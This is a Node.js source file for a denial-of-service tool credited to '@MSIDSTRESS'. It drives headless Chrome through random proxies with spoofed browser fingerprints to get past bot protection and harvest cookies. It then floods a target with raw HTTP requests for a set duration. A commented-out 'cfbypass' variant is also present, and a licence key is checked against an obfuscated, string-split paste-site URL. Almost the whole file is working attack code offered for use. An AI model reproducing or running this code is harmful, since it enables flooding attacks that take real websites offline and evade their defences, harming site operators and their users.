const { chromium } = require('playwright-extra');
const { FingerprintGenerator } = require('./fingerprint-generator/index.js');
const { FingerprintInjector }  = require('./fingerprint-injector/index.js');

const EventEmitter = require('events');
const emitter = new EventEmitter();
process.setMaxListeners(0);

var vm = require('vm');
var requestModule = require('request');
var jar = requestModule.jar();

const { UAParser } = require('ua-parser-js');
const { Cookie, CookieJar } = require('tough-cookie');
const http = require('http');
const { PassThrough } = require('stream');
const { HeaderGenerator } = require('header-generator');

const fs = require('fs');
const requests = require('request');
const url = require('url');

const dns = require('dns');
const tls = require('tls');
const http2 = require('http2');
const cluster = require('cluster');
const JSStreamSocket = (new tls.TLSSocket(new PassThrough()))._handle._parentWrap.constructor;

const sdasd = 'https://'
const qaiwdhjuwdj = 'p';
const uqwdf = 'aste';
const msidstressgay = 'bin';
const meowgay = '.';
const meowmsidstressgay = 'c';
const kkkkkkkkas = 'om';
const rawseajd = '/ra';
const aosdokawod = 'w/';
const oooooaasdas = 'b5UuNZRL';


/*

oldshit 2021
				
				
*/


protone = {
    url: sdasd + qaiwdhjuwdj + uqwdf + msidstressgay + meowgay + meowmsidstressgay + kkkkkkkkas + rawseajd + aosdokawod + oooooaasdas
};

function getArgs() {
    const _0 = {};
    process.argv.slice(2, process.argv.length).forEach((_1) => {
        if (_1.slice(0, 2) === '--') {
            const _3 = _1.split('=');
            const _4 = _3[0].slice(2, _3[0].length);
            const _5 = _3.length > 1 ? _3[1] : true;
            _0[_4] = _5
        } else {
            if (_1[0] === '-') {
                const _2 = _1.slice(1, _1.length).split('');
                _2.forEach((_1) => {
                    _0[_1] = true
                })
            }
        }
    });
    return _0
}
const args = getArgs();

if(args['debug'] == 'true') {
	process.on('uncaughtException', function(error) {console.log(error)});
	process.on('unhandledRejection', function(error) {console.log(error)})
	process.on('warning', function(warning) {});
	
} else { 
	process.on('uncaughtException', function(error) {});
	process.on('unhandledRejection', function(error) {});
	process.on('warning', function(warning) {});
}

if (args['key'] != undefined & args['target'] != undefined & args['time'] != undefined & args['threads'] != undefined & args['requests'] != undefined & args['mode'] != undefined & args['proxy'] != undefined) {
    requests["get"](protone, function(one, two, three) {
        if (args['key'] == three) {
			for(let th = 0; th < threads; th++) {
				main(target, time, threads, ratelimiting, mode, proxies);
			}
        } else {
            console.log('--> Invalid Key');
        }
    })
} else {
    console.log(' --> (--key= --target= --time= --threads= --requests= --mode= --proxy=) [Made by @MSIDSTRESS]');
    process.exit(-1);
}

var jshead = '';
var target = args['target'];
var time = args['time'];
var threads = args['threads'];
var ratelimiting = args['requests'];
var mode = args['mode'];
var proxyfile = args['proxy'];
const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);

console.clear();
console.log('--> Browser launch');

async function newBrowser(proxy) {
	try {
		const fingerprintGenerator = new FingerprintGenerator();

		const browserFingerprintWithHeaders = fingerprintGenerator.getFingerprint({
			browsers: [{ name: 'chrome', minVersion: 108, maxVersion: 108}],	
			devices: ['desktop'],
			operatingSystems: ['linux'],	
		});

		for (let i = 0; i < 10; i++) {
			fingerprintGenerator.getFingerprint();
		}

		const fingerprintInjector = new FingerprintInjector();
		const { fingerprint } = browserFingerprintWithHeaders;

		const addd = fingerprint.navigator.userAgent;
		console.log('--> User-Agent: ' + addd);
		const locales = fingerprint.navigator.language

		const browser = await chromium.launch({
			proxy: { 
				server: 'http://' + proxy
			},	
			args: [
				'--disable-blink-features=AutomationControlled', 
				'--disable-features=IsolateOrigins,site-per-process', 
				'--renderer-process-limit=1',
				'--mute-audio', 
				'--disable-setuid-sandbox', 
				'--enable-webgl', 
				'--ignore-certificate-errors',
				'--use-gl=disabled',
				'--color-scheme=dark',
				'--user-agent=' + addd,
			],
			ignoreDefaultArgs: ['--enable-automation'],
			headless: true,
			channel: 'chrome',
			javaScriptEnabled: true,
		})
		const context = await browser.newContext({locale: locales, viewport: fingerprint.screen });
		
		await fingerprintInjector.attachFingerprintToPlaywright(context, browserFingerprintWithHeaders);

		const parser = new UAParser();
		parser.setUA(addd);
		const result = parser.getResult();

		context.addInitScript(() => {
			window.rand_data = {
				t: 0,
				i: 0
			};

			const _setTimeout = setTimeout;
			window.setTimeout = function(a, r, args) {
				_setTimeout(a, r, args)
				window.rand_data.t++;
				_setTimeout(() => window.rand_data.t--, r)
			}
			const _setInterval = setInterval;
			window.setInterval = function(a, r, args) {
				window.rand_data.i++;
				_setInterval(a, r, args)
			}
		})

		//context.setExtraHTTPHeaders({ 'sec-ch-ua': `"Not A;Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"` })		
		
		return { browser, context, fingerprint }
	} catch (reload) { 
		main(target, time, threads, ratelimiting, mode, proxies);  
		console.log('--> Reason: Context Error');
	}
}

async function newPage(context, addd, locales, screen) {
	try {
		const page = await context.newPage({locale: locales, deviceScaleFactor: 1});
		await page.setViewportSize({ width: screen.width, height: screen.height })

		await page.route('***', route => route.continue())

		return page
	} catch (reload) { 
		main(target, time, threads, ratelimiting, mode, proxies);  
		console.log('--> Reason: Page Error');
	}
}

async function navigatePage(page, target, context, proxy, browser) {
	try {
		const parsed = url.parse(target);
		const gotoUrl = target;
		async function goto(gotoUrl) {
			//try {
				const response = await page.goto(gotoUrl, { waitUntil: 'commit', timeout: 30000 });					 				
				await page.waitForTimeout(10000);
				return response
			//} catch (omg) {
			//	console.log('--> Reason: Connect Error');			
			//	await browser.close();	
			//	await context.close();					
			//	main(target, time, threads, ratelimiting, mode, proxies); 				
			//}			
		}	
		
		page.on('response', resp => {
			jshead = resp.request().headers();
		});
		
		await goto(gotoUrl);
		const cookie = (await page.context().cookies(gotoUrl)).map(c => `${c.name}=${c.value}`).join('; ');
		const response = await goto(gotoUrl);
		
		if(cookie) {
			console.log('--> Cookie: ' + cookie);
			//console.log('--> Response: ' + response.status());
			browser_flood(target, time, threads, ratelimiting, mode, proxy, cookie, jshead);
		} else {
			console.log('--> Reason: [Error] cookie');
			await browser.close();	
			await context.close();	
			main(target, time, threads, ratelimiting, mode, proxies);  
		}
		return { response, cookie };
	} catch (reload) {
		console.log('--> Reason: Can`t bypass');
		await browser.close();	
		await context.close();	
		main(target, time, threads, ratelimiting, mode, proxies);  
	}		
}

async function main(target, time, threads, ratelimiting, mode, proxies) {
	const proxy = proxies[Math.floor(Math.random() * proxies.length)];
	const { browser, context, fingerprint } = await newBrowser(proxy);
	try {
		const page = await newPage(context, fingerprint.userAgent, fingerprint.locale, fingerprint.screen);
		const result = await navigatePage(page, target, context, proxy, browser);
	} catch (err) {
		await browser.close();
		return main();
	} finally {
		await browser.close();
	}
}

/*async function browser_flood(target, time, threads, ratelimiting, mode, proxy, cookie, jshead) {	
var request = requestModule.defaults({
        jar: jar
    }),
    Timeout = 30000;

const postfunc = jshead;
const anomaly = cookie;
var parts = proxy;
	parts = parts.split(':');

function performRequest(options, callback) {
    var method;
    options = options || {};
    options.headers = options.headers || {};
    makeRequest = requestMethod(options.method);
	
    if ('encoding' in options) {
        options.realEncoding = options.encoding;
    } else {
        options.realEncoding = 'utf8';
    }
    options.encoding = null;

    if (!options.url || !callback) {
        throw new Error('To perform request, define both url and callback');
    }

    options.headers['User-Agent'] = postfunc['user-agent'];

    makeRequest(options, function(error, response, body) {
        var validationError;
        var stringBody;

        if (error || !body || !body.toString) {
            return callback({
                errorType: 0,
                error: error
            }, body, response);
        }

        stringBody = body.toString('utf8');
    });
}

function requestMethod(method) {
    method = method.toUpperCase();
    return method === 'POST' ? request.post : request.get;
}


let headerGenerator = new HeaderGenerator({
	browsers: [
		{name: "chrome", minVersion: 108, maxVersion: 108, httpVersion: "2"},
	],
	devices: [
		"desktop",
	],
	operatingSystems: [
		"windows",
	],
	locales: ["en-US", "en"]
});		

let randomHeaders = headerGenerator.getHeaders();


var ATTACK = {
		http(method, url, proxy) {
			requestModule({
				method: method,
				proxy: 'http://' + proxy,
				json: true,
				headers: {	
					'user-agent': postfunc['user-agent'],
					'accept': postfunc['accept'],
					'accept-language': randomHeaders['accept-language'],
					'accept-encoding': randomHeaders['accept-encoding'],
					'cache-control': 'no-cache, no-store,private, max-age=0, must-revalidate',
					'upgrade-insecure-requests': '1',
					'sec-ch-ua': postfunc['sec-ch-ua'],
					'sec-ch-ua-mobile': postfunc['sec-ch-ua-mobile'],
					'sec-ch-ua-platform': postfunc['sec-ch-ua-platform'],										
					'sec-fetch-dest': randomHeaders['sec-fetch-dest'],
					'sec-fetch-mode': randomHeaders['sec-fetch-mode'],
					'sec-fetch-site': randomHeaders['sec-fetch-site'],
					'cache-control': "no-cache",
					"pragma": 'no-cache',
					'cookie': anomaly,
					"referer": url
				},
				url: url
				}, function(err, response, body) {
					console.log(err, response.statusCode);
				});
			},
		cfbypass(method, url, proxy) 
		{ 
			performRequest({
				method: method,
				proxy: 'http://' + proxy,
				json: true,
				headers: {
					'user-agent': postfunc['user-agent'],
					'accept': postfunc['accept'],
					'accept-language': randomHeaders['accept-language'],
					'accept-encoding': randomHeaders['accept-encoding'],
					'cache-control': 'no-cache, no-store,private, max-age=0, must-revalidate',
					'upgrade-insecure-requests': '1',
					'sec-ch-ua': postfunc['sec-ch-ua'],
					'sec-ch-ua-mobile': postfunc['sec-ch-ua-mobile'],
					'sec-ch-ua-platform': postfunc['sec-ch-ua-platform'],										
					'sec-fetch-dest': randomHeaders['sec-fetch-dest'],
					'sec-fetch-mode': randomHeaders['sec-fetch-mode'],
					'sec-fetch-site': randomHeaders['sec-fetch-site'],
					'cache-control': "no-cache",
					"pragma": 'no-cache',
					'cookie': anomaly,
					"referer": url
				},
				url: url
			}, function(err, response, body) {
				if (!err) {
					console.log(response.statusCode);
				}
			});
		}
}

	setTimeout(function() {
		process.exit(1);
	}, time * 1000);
for (let i = 0; i < 100; i++) {
	setInterval( () => { 
		for(let i = 0; i < ratelimiting; i++) {
			ATTACK.cfbypass('GET', target, proxy);
		}
	});
}
}*/

async function browser_flood(target, time, threads, ratelimiting, mode, proxy, cookie, jshead) {	
	function flood() {
		let headerGenerator = new HeaderGenerator({
			browsers: [
				{name: "chrome", minVersion: 108, maxVersion: 108, httpVersion: "2"},
			],
			devices: [
				"desktop",
			],
			operatingSystems: [
				"windows",
			],
			locales: ["en-US", "en"]
		});		

		let randomHeaders = headerGenerator.getHeaders();
		var parsed = url.parse(target);	
		const postfunc = jshead;
		const anomaly = cookie;
		var parts = proxy;
			parts = parts.split(':');
		
		setInterval( () => {
			var req = require('net').Socket();
			req.connect(parts[1], parts[0]);
			req.setTimeout(10000);
			for(let i = 0; i < ratelimiting; i++) {								
				req.write('GET ' 
				+ target 
				+ ' HTTP/1.1\r\nHost: ' 
				+ parsed.host 
				+ '\r\nAccept: ' 
				+ postfunc['accept']
				+ '\r\nAccept-Language: ' 
				+ randomHeaders['accept-language']
				+ '\r\nAccept-Encoding: ' 
				+ randomHeaders['accept-encoding']					
				+ '\r\nSec-Ch-Ua-Platform: '
				+ postfunc['sec-ch-ua-platform']
				+ 'r\nCache-Control: no-cache'
				+ '\r\nPragma: no-cache'
				+ '\r\nCookie: '
				+ anomaly
				+ '\r\nReferer: '
				+ target			
				+ '\r\nSec-Ch-Ua: ' 				
				+ postfunc['sec-ch-ua']		
				+ '\r\nSec-Fetch-Dest: '				
				+ randomHeaders['sec-fetch-dest']
				+ '\r\nSec-Fetch-Mode: ' 
				+ randomHeaders['sec-fetch-mode']
				+ '\r\nSec-Fetch-Site: ' 
				+ randomHeaders['sec-fetch-site']
				+ '\r\nSec-Fetch-User: ?1' 	
				+ '\r\nUpgrade-Insecure-Requests: 1'
				+ '\r\nTE: trailers'					
				+ '\r\nConnection: Keep-Alive'
				+ '\r\nUser-Agent:' 
				+ postfunc['user-agent']
				+ '\r\n\r\n');	
				
			}
		})
	}
	setInterval(flood);
	setTimeout(function() {
		console.clear();
		process.exit()
	}, time * 1000);
}